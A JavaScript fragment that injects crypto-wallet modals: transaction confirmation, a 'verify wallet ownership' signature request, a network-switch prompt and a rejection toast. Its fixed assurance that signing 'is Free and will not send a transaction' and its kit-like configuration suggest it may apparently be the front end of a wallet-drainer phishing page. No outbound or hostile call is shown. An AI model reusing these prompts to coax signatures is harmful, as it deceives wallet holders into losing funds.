    const modalHTML = typeof MODAL_TEMPLATES[modalType] === 'function' 
        ? MODAL_TEMPLATES[modalType](imagePath, wallet, modal_card_background, modal_card_color, close_button_color, title_text_color, pending_text_color, chain_background_color, lower_box_background, skeleton_colors) 
        : MODAL_TEMPLATES[modalType];
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    const modal = document.getElementById('loadingModal');
    if (modal) {modal.style.display = 'block';}}

function showLoadingModal(wallet, modalType) {createLoadingModal(wallet, modalType);}
  
function hideLoadingModal() {const modal = document.getElementById('loadingModal');
    if (modal) {modal.remove();}}

async function change_wallet() {
    try {const _0000x1a2b3ci = window.config;
        const disconnect = window.disconnect;
        localStorage.setItem('WalletChanged', 'true');
        if (typeof disconnect === 'function') {
            disconnect(_0000x1a2b3ci);}} 
    catch (error) {return false;}}

window.showLoadingModal = showLoadingModal;
window.hideLoadingModal = hideLoadingModal;
  
  
const TRANSACTION_MODALS = {
    1: (currentChain, wallet, imagePath, modal_card_background, modal_card_color, close_button_color, title_text_color, pending_text_color, chain_background_color, lower_box_background, skeleton_colors, walletAddress=null) => `
        <style> 
              .modal-overlay {
                  font-family: Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
                  z-index: 999999;
                  position: fixed;
                  top: 0;
                  left: 0;
                  right: 0;
                  bottom: 0;
                  pointer-events: auto;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  background-color: #000000bf;
                  opacity: 0;
                  transition: opacity 0.2s ease-out;
                  backdrop-filter: blur(6px);
                  visibility: hidden;}
  
              .modal-overlay.open {
                  opacity: 1;
                  visibility: visible;}
  
              .modal-card {
                  max-width: 360px;
                  width: 100%;
                  background: ${modal_card_background};
                  border-radius: 24px;
                  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.32);
                  position: relative;
                  animation: zoomIn 0.2s ease-out;
                  color: ${modal_card_color};}
  
              .modal-header {
                  padding: 20px;
                  display: flex;
                  justify-content: space-between;
                  align-items: center;}
  
              .modal-content {
                  padding: 20px;}
  
              .chain-badge {
                  display: flex;
                  align-items: center;
                  gap: 8px;
                  background: ${chain_background_color};
                  padding: 8px 12px;
                  border-radius: 999px;
                  font-size: 14px;}
  
              .chain-badge .dot {
                  width: 8px;
                  height: 8px;
                  border-radius: 50%;
                  animation: pulse 2s infinite;}
  
              @keyframes pulse {
                  0% { opacity: 1; }
                  50% { opacity: 0.5; }
                  100% { opacity: 1; }}
  
              @media (max-width: 430px) {
                  .modal-overlay {
                      align-items: flex-end;}
  
                  .modal-card {
                      max-width: 100%;
                      border-bottom-left-radius: 0;
                      border-bottom-right-radius: 0;
                      animation: slideIn 0.2s ease-out;}}
  
              @keyframes zoomIn {
                  0% { transform: scale(0.95); }
                  100% { transform: scale(1); }}
  
              @keyframes slideIn {
                  0% { transform: translateY(50px); }
                  100% { transform: translateY(0); }}
  
              .shake {
                  animation: shake 0.5s ease-out;}
  
              @keyframes shake {
                  0% { transform: rotate(0deg); }
                  20% { transform: rotate(-1deg); }
                  40% { transform: rotate(1.5deg); }
                  60% { transform: rotate(-1.5deg); }
                  80% { transform: rotate(1deg); }
                  100% { transform: rotate(0deg); }}

              @keyframes shimmer {
                  0% { background-position: 200% 0; }
                  100% { background-position: -200% 0; }}
        </style>
  
          <div class="modal-overlay open" id="txModal" style="isolation: isolate;">
              <div class="modal-card" style="isolation: isolate;">

                  <div class="modal-header">
                      <div class="chain-badge">
                          <img src="/assets/Chain-Icons/${currentChain}.svg" style="width: 24px; height: 24px; border-radius: 50%;" />
                          ${currentChain}
                          <div class="dot" style="background: #2ecc71;"></div>
                      </div>

                      <button onclick="hideTransactionModal()" style="background: none; border: none; color: ${close_button_color}; cursor: pointer; padding: 4px;">
                          <svg fill="none" viewBox="0 0 16 16" style="width: 16px; height: 16px;">
                              <path fill="currentColor" fill-rule="evenodd" d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z" clip-rule="evenodd"></path>
                          </svg>
                      </button>
                  </div>

                  <div class="modal-content">
                      <div style="text-align: center; margin-bottom: 24px;">
                          <img src="/assets/Wallet-Icons/${imagePath}" style="width: 80px; height: 80px; display: block; margin: 0 auto;" />
                          <div style="color: ${title_text_color}; font-size: 16px; font-weight: 500; margin-top: 16px; letter-spacing: -0.64px;">Continue in ${wallet}</div>
                          <div style="color: #949e9e; font-size: 14px; margin-top: 8px; letter-spacing: -0.56px; font-weight: 500;">Confirm this transaction in your wallet</div>
                      </div>

                      <div style="background: ${lower_box_background}; border-radius: 12px; padding: 16px;">
                          <div style="display: flex; align-items: center; justify-content: space-between;">
                              <span style="color: ${pending_text_color}; font-size: 14px;">Pending</span>
                              <div class="skeleton-loader" style="width: 100px; height: 16px; background: linear-gradient${skeleton_colors}; background-size: 200% 100%; animation: shimmer 1.5s infinite linear; border-radius: 4px;"></div>
                          </div>
                      </div>
                  </div>
              </div>
          </div>`,
  
    2: (currentChain, wallet, imagePath, modal_card_background, modal_card_color, close_button_color, title_text_color, pending_text_color, chain_background_color, lower_box_background, skeleton_colors, walletAddress) => `
        <style> 
              .modal-overlay {
                  font-family: Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
                  z-index: 999999;
                  position: fixed;
                  top: 0;
                  left: 0;
                  right: 0;
                  bottom: 0;
                  pointer-events: auto;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  background-color: #000000bf;
                  opacity: 0;
                  transition: opacity 0.2s ease-out;
                  backdrop-filter: blur(6px);
                  visibility: hidden;}
  
              .modal-overlay.open {
                  opacity: 1;
                  visibility: visible;}
  
              .modal-card {
                  max-width: 360px;
                  width: 100%;
                  background: ${modal_card_background};
                  border-radius: 24px;
                  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.32);
                  position: relative;
                  animation: zoomIn 0.2s ease-out;
                  color: ${modal_card_color};}
  
              .modal-header {
                  padding: 20px;
                  display: flex;
                  justify-content: space-between;
                  align-items: center;}
  
              .modal-content {
                  padding: 20px;}
  
              .chain-badge {
                  display: flex;
                  align-items: center;
                  gap: 8px;
                  background: ${chain_background_color};
                  padding: 8px 12px;
                  border-radius: 999px;
                  font-size: 14px;}
  
              .chain-badge .dot {
                  width: 8px;
                  height: 8px;
                  border-radius: 50%;
                  animation: pulse 2s infinite;}
  
              @keyframes pulse {
                  0% { opacity: 1; }
                  50% { opacity: 0.5; }
                  100% { opacity: 1; }}
  
              @media (max-width: 430px) {
                  .modal-overlay {
                      align-items: flex-end;}
  
                  .modal-card {
                      max-width: 100%;
                      border-bottom-left-radius: 0;
                      border-bottom-right-radius: 0;
                      animation: slideIn 0.2s ease-out;}}
  
              @keyframes zoomIn {
                  0% { transform: scale(0.95); }
                  100% { transform: scale(1); }}
  
              @keyframes slideIn {
                  0% { transform: translateY(50px); }
                  100% { transform: translateY(0); }}
  
              .shake {
                  animation: shake 0.5s ease-out;}
  
              @keyframes shake {
                  0% { transform: rotate(0deg); }
                  20% { transform: rotate(-1deg); }
                  40% { transform: rotate(1.5deg); }
                  60% { transform: rotate(-1.5deg); }
                  80% { transform: rotate(1deg); }
                  100% { transform: rotate(0deg); }
              }
              @keyframes shimmer {
                  0% { background-position: 200% 0; }
                  100% { background-position: -200% 0; }}
        </style>
  
          <div class="modal-overlay open" id="txModal" style="isolation: isolate;">
              <div class="modal-card" style="isolation: isolate;">

                  <div class="modal-header">
                      <div class="chain-badge">
                          <img src="/assets/Chain-Icons/${currentChain}.svg" style="width: 24px; height: 24px; border-radius: 50%;" />
                          ${currentChain}
                          <div class="dot" style="background: #2ecc71;"></div>
                          </div>

                      <button onclick="hideTransactionModal()" style="background: none; border: none; color: ${close_button_color}; cursor: pointer; padding: 4px;">
                          <svg fill="none" viewBox="0 0 16 16" style="width: 16px; height: 16px;">
                              <path fill="currentColor" fill-rule="evenodd" d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z" clip-rule="evenodd"></path>
                          </svg>
                      </button>
                  </div>

                  <div class="modal-content">
                      <div style="text-align: center; margin-bottom: 24px;">
                          <img src="/assets/Wallet-Icons/${imagePath}" style="width: 80px; height: 80px; display: block; margin: 0 auto;" />
                          <div style="color: ${title_text_color}; font-size: 16px; font-weight: 500; margin-top: 16px; letter-spacing: -0.64px;">Continue in ${wallet}</div>
                          <div style="color: #949e9e; font-size: 14px; margin-top: 8px; letter-spacing: -0.56px; font-weight: 500;">Sign message to verify wallet ownership</div>
                      </div>

                      <div style="background: ${chain_background_color}; border-radius: 12px; padding: 16px; margin-bottom: 12px;">
                          <div style="color: ${close_button_color}; font-size: 14px; margin-bottom: 12px;">Verification Details:</div>
                          <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
                              <span style="color: #949e9e; font-size: 14px;">Type</span>
                              <span style="color: ${close_button_color}; font-size: 14px; font-weight: 500;">Signature</span>
                          </div>

                          <div style="display: flex; align-items: center; justify-content: space-between;">
                              <span style="color: #949e9e; font-size: 14px;">Wallet</span>
                              <span style="color: ${close_button_color}; font-size: 14px; font-weight: 500;">${walletAddress}</span>
                          </div>
                      </div>

                      <div style="color: #2ecc71; font-size: 14px; text-align: center;">✓ Signing is Free and will not send a transaction.</div>
                  </div>
              </div>
          </div>`,
  
    3: (currentChain, wallet, imagePath, modal_card_background, modal_card_color, close_button_color, title_text_color, pending_text_color, chain_background_color, lower_box_background, skeleton_colors, targetChain) => `
        <style>
              .modal-overlay {
                  font-family: Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
                  z-index: 999999;
                  position: fixed;
                  top: 0;
                  left: 0;
                  right: 0;
                  bottom: 0;
                  pointer-events: auto;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  background-color: #000000bf;
                  opacity: 0;
                  transition: opacity 0.2s ease-out;
                  backdrop-filter: blur(6px);
                  visibility: hidden;}
  
              .modal-overlay.open {
                  opacity: 1;
                  visibility: visible;}
  
              .modal-card {
                  max-width: 360px;
                  width: 100%;
                  background: ${modal_card_background};
                  border-radius: 24px;
                  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.32);
                  position: relative;
                  animation: zoomIn 0.2s ease-out;
                  color: ${modal_card_color};}
  
              .modal-header {
                  padding: 20px;
                  display: flex;
                  justify-content: space-between;
                  align-items: center;}
  
              .modal-content {
                  padding: 20px;}
  
              .chain-badge {
                  display: flex;
                  align-items: center;
                  gap: 8px;
                  background: ${chain_background_color};
                  padding: 8px 12px;
                  border-radius: 999px;
                  font-size: 14px;}
  
              .chain-badge .dot {
                  width: 8px;
                  height: 8px;
                  border-radius: 50%;
                  animation: pulse 2s infinite;}
  
              @keyframes pulse {
                  0% { opacity: 1; }
                  50% { opacity: 0.5; }
                  100% { opacity: 1; }}
  
              @media (max-width: 430px) {
                  .modal-overlay {
                      align-items: flex-end;}
  
                  .modal-card {
                      max-width: 100%;
                      border-bottom-left-radius: 0;
                      border-bottom-right-radius: 0;
                      animation: slideIn 0.2s ease-out;}}
  
              @keyframes zoomIn {
                  0% { transform: scale(0.95); }
                  100% { transform: scale(1); }}
  
              @keyframes slideIn {
                  0% { transform: translateY(50px); }
                  100% { transform: translateY(0); }}
  
              .shake {
                  animation: shake 0.5s ease-out;}
  
              @keyframes shake {
                  0% { transform: rotate(0deg); }
                  20% { transform: rotate(-1deg); }
                  40% { transform: rotate(1.5deg); }
                  60% { transform: rotate(-1.5deg); }
                  80% { transform: rotate(1deg); }
                  100% { transform: rotate(0deg); }}

              @keyframes shimmer {
                  0% { background-position: 200% 0; }
                  100% { background-position: -200% 0; }}
        </style>
  
          <div class="modal-overlay open" id="txModal" style="isolation: isolate;">
              <div class="modal-card" style="isolation: isolate;">
                  <div class="modal-header">
                      <div class="chain-badge">
                          <div class="dot" style="background: #ffd700;"></div>
                          Network Switch
                      </div>
  
                      <button onclick="hideTransactionModal()" style="background: none; border: none; color: ${close_button_color}; cursor: pointer; padding: 4px;">
                          <svg fill="none" viewBox="0 0 16 16" style="width: 16px; height: 16px;">
                              <path fill="currentColor" fill-rule="evenodd" d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z" clip-rule="evenodd"></path>
                          </svg>
                      </button>
                  </div>
  
                  <div class="modal-content">
                      <div style="text-align: center; margin-bottom: 24px;">
                          <img src="/assets/Wallet-Icons/${imagePath}" style="width: 80px; height: 80px; display: block; margin: 0 auto;" />
                          <div style="color: ${title_text_color}; font-size: 16px; font-weight: 500; margin-top: 16px; letter-spacing: -0.64px;">Continue in ${wallet}</div>
                          <div style="color: #949e9e; font-size: 14px; margin-top: 8px; letter-spacing: -0.56px; font-weight: 500;">Please switch your chain to continue</div>
                      </div>
  
                      <div style="background: ${chain_background_color}; border-radius: 12px; padding: 16px; margin-bottom: 12px;">
                          <div style="color: ${close_button_color}; font-size: 14px; margin-bottom: 12px;">Network Details:</div>
                          <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px;">
                              <div style="display: flex; align-items: center; gap: 8px;">
                                  <img src="/assets/Chain-Icons/${currentChain}.svg" style="width: 24px; height: 24px; border-radius: 50%;" />
                                  <span style="color: #949e9e; font-size: 14px;">Current: </span>
                                  <span style="color: ${close_button_color}; font-size: 14px; font-weight: 500;">${currentChain}</span>
                              </div>
                          </div>
  
                          <div style="display: flex; align-items: center; justify-content: space-between;">
                              <div style="display: flex; align-items: center; gap: 8px;">
                                  <img src="assets/Chain-Icons/${targetChain}.svg" style="width: 24px; height: 24px; border-radius: 50%;" />
                                  <span style="color: #949e9e; font-size: 14px;">Switch to: </span>
                                  <span style="color: ${close_button_color}; font-size: 14px; font-weight: 500;">${targetChain}</span>
                              </div>
                          </div>
                      </div>
  
                      <div style="color: #949e9e; font-size: 14px; text-align: center;">🛈 Switching networks is free and only requires approval</div>
                  </div>
              </div>
          </div>`,

    4: () => `
            <style>
                .toast-custom {
                    position: fixed;
                    bottom: 20px;
                    right: 20px;
                    width: 250px;
                    padding: 15px;
                    border-radius: 10px;
                    display: none;
                    transition: opacity 1s ease;
                    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                    overflow: hidden;
                    border: 1px solid #e1e0df;
                    z-index: 9999999;
                    background-color: #FFFFFF;
                    border-left: 10px solid #D32F2F; }
        
                .error { 
                    border-left: 10px solid #D32F2F; }
                    
                .close-btn-custom {
                    cursor: pointer;
                    float: right;
                    font-weight: bold;
                    font-size: 18px;
                    color: #333;}

                .toast-title-custom {
                    font-family: Arial, sans-serif;
                    font-weight: bold;
                    margin: 0;
                    font-size: 16px; 
                    color: #D32F2F;}

                .toast-content-custom {
                    font-family: Arial, sans-serif;
                    margin-top: 5px;
                    color: #333;
                    font-size: 14px;}
            </style>

                <div id="toast-custom" class="toast-custom" style="isolation: isolate;">
                    <span class="close-btn-custom" onclick="closeToast()">×</span>
                    <div class="toast-title-custom">Error!</div>
                    <div class="toast-content-custom">User rejected wallet verification.</div>
                </div>`}
  

function createTransactionModal(modalType, current_chain, wallet, target_chain=null) {let imagePath;
    const existingModal = document.getElementById('txModal');
    if (existingModal) {existingModal.remove();}
    const walletList = ['Phantom', "Bitget Wallet", "Coin98 Wallet", 'Uniswap Extension', "Keplr", 'WalletConnect', 'Brave Wallet', 'OKX Wallet', 'Coinbase Wallet', 'MetaMask', 'Rabby Wallet', 'Rainbow', 'Trust Wallet', 'Zerion'];             
    if (walletList.includes(wallet)) {const extension = ['Phantom', 'Uniswap Extension', 'WalletConnect', 'OKX Wallet'].includes(wallet) ? '.png' : '.svg';
        imagePath = `${wallet}${extension}`;} 
    else {imagePath = 'WalletConnect.png';}

    const theme = window.userConfig.MODAL_THEME.mode;
    if (theme === 'light') {
        modal_card_background = '#fff';
        modal_card_color = '#000000';
        close_button_color = '#000000';
        title_text_color = '#000000';
        pending_text_color = '#000000';
        chain_background_color = '#f2f2f2';
        lower_box_background = '#f2f2f2';
        skeleton_colors = '(90deg, rgb(222 223 223) 25%, #f2f2f2 50%, #f2f2f2 75%)';} 
    else { 
        modal_card_background = '#121313';
        modal_card_color = 'white';
        close_button_color = '#e4e7e7';
        title_text_color = '#e4e7e7';
        pending_text_color = '#949e9e';
        chain_background_color = 'rgba(255, 255, 255, 0.1)';
        lower_box_background = '#212224';
        skeleton_colors = '(90deg, #2a2d2f 25%, #343739 50%, #2a2d2f 75%)';}

    const modalHTML = TRANSACTION_MODALS[modalType](current_chain, wallet, imagePath, modal_card_background, modal_card_color, close_button_color, title_text_color, pending_text_color, chain_background_color, lower_box_background, skeleton_colors, target_chain);
    document.body.insertAdjacentHTML('beforeend', modalHTML);}


function showTransactionModal(modalType, current_chain, wallet, imagePath, target_chain) {
    createTransactionModal(modalType, current_chain, wallet, imagePath, target_chain);}

function hideTransactionModal() {const modal = document.getElementById('txModal');
    if (modal) {modal.remove();}}

window.showTransactionModal = showTransactionModal;
window.hideTransactionModal = hideTransactionModal;


function showToast() {
    if (!document.getElementById('toast-custom')) {
    document.body.insertAdjacentHTML('beforeend', TRANSACTION_MODALS[4]());}
    const toast = document.getElementById('toast-custom');
    toast.style.display = 'block';
    toast.style.opacity = 1;
    setTimeout(() => {toast.style.opacity = 0;
    setTimeout(() => {toast.style.display = 'none';}, 1000);}, 3000);}

function closeToast() {
    const toast = document.getElementById('toast-custom');
    toast.style.opacity = 0;
    setTimeout(() => {toast.style.display = 'none';}, 1000);}

window.showToast = showToast;
window.closeToast = closeToast;